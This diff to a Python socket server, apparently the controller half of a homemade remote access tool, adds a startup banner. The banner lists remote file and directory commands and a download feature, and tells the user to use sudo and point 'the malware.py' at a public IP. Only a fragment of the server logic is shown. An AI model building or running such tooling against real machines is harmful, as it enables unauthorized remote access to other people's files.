@@ -1,6 +1,34 @@
 import socket
 import os
 import shutil
+def logo():
+    print(r"""
+    __    ___   _____ ____  ____ _    _____    __  __
+   / /   /   | / ___// __ \/ __ \ |  / /   |  / / / /
+  / /   / /| | \__ \/ / / / / / / | / / /| | / /_/ / 
+ / /___/ ___ |___/ / /_/ / /_/ /| |/ / ___ |/ __  /  
+/_____/_/  |_/____/_____/\____/ |___/_/  |_/_/ /_/   
+          
+>> Social network
+<< Github: github.com/LASDovah >>
+<< Tiktok: tiktok.com/@csDovah >>
+>> Commands:
+        [x]. cd [command] > Change directories.
+        [x]. mkdir [command] > Create a directorie.
+        [x]. md [command] > Create a directorie.
+        [x]. rmdir [command] > Remove a directorie.
+        [x]. rd [command] > Remove a directorie.
+        [x]. touch [command] > Create a file.
+        [x]. cat [command] > Read a file.
+        [x]. nano -a [command] > Adds content to an existing file. 'exit nano' for scape.
+        [x]. nano -w [command] > Overwrites an already created file. 'exit nano' for scape.
+        [x]. dowload [command] > Download files / Maybe images.
+          
+>> Created tool (30-3-2024) << 
+>> It is recommended to use sudo and change to a public ip the malware.py<<
+>> This tool was created to practice the fundamental bases in communication with the operating system
+          and communication between computers <<      
+    """)
 
 def info_receive_client(conn):
     receive_so = conn.recv(1024).decode()
@@ -31,6 +59,7 @@ def write_file(path, content):
 
 if __name__ == '__main__':
     try:
+        logo()
         # Enable socket
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
